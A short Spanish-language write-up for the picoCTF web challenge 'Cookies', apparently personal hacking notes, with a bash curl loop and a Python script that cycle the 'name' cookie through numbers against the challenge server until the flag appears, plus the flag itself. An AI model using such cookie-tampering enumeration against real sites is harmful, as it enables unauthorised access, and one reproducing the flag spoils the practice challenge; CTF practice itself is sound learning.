#notas_hacking #web
# Reto
## Descripción
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:27177/](http://mercury.picoctf.net:27177/)
## Solución
Si ingresas una galleta que no es valida dentro de la cookie name asigna un valor de -1, si se pone snickerdoodle regresa un 0, si se cambia a 1 u otro numero natural es una cookie correcta pero no la especial
 ```bash
┌──(kali㉿kali)-[~]
└─$ for i in {0..20}; do curl -s http://mercury.picoctf.net:27177/check -H "Cookie: name=$i"; done | grep picoCTF
            <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_064663be}</code></p>
 ```
 o en `python`
 ```python
import requests
import re

url = "http://mercury.picoctf.net:27177/check"

for i in range(20):
        cookies = {'name':'{}'.format(i)}
        r = requests.get(url, cookies=cookies)
        if 'picoCTF{' in r.text:
                flag = re.findall('picoCTF{.*}', r.text)[0]
                print(flag)
 ```
 ```bash
┌──(kali㉿kali)-[~/retos]
└─$ python exp.py
picoCTF{3v3ry1_l0v3s_c00k135_064663be}
 ```
## Notas
## Referencias
